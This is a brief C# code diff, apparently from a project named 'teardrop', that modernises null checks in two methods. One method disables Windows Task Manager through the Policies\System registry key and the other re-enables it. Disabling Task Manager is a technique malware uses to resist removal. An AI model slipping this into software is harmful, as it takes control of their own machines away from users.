@@ -11,7 +11,7 @@ namespace teardrop
         {
             using (RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
             {
-                if (objRegistryKey.GetValue("DisableTaskMgr") == null)
+                if (objRegistryKey.GetValue("DisableTaskMgr") is null)
                 {
                     objRegistryKey.SetValue("DisableTaskMgr", "1");
                 }
@@ -25,7 +25,7 @@ namespace teardrop
         {
             using (RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
             {
-                if (objRegistryKey.GetValue("DisableTaskMgr") != null)
+                if (objRegistryKey.GetValue("DisableTaskMgr") is not null)
                 {
                     objRegistryKey.DeleteValue("DisableTaskMgr");
                 }
